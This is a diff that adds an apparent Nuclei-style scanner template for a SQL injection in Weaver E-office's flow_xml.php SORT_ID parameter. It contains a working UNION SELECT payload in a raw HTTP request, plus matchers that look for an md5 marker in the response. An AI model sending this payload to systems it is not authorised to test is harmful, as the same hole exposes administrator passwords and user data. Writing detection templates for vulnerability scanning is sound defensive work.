@@ -1,0 +1,30 @@
+id: weaver-eoffice-sql-injection
+info:
+  name: Weaver E-office flow_xml.php SORT_ID SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver E-office is a product for small and medium-sized organizations. There is an SQL injection vulnerability in flow_xml.php's SORT_ID parameter, which can be exploited to obtain sensitive database information such as administrator passwords and user details.
+  classification:
+    cvss-score: 7.8
+    cve-id: []
+    cwe-id: []
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e4da3b7fbbce2345d7772b0674a318d5"
+        part: body
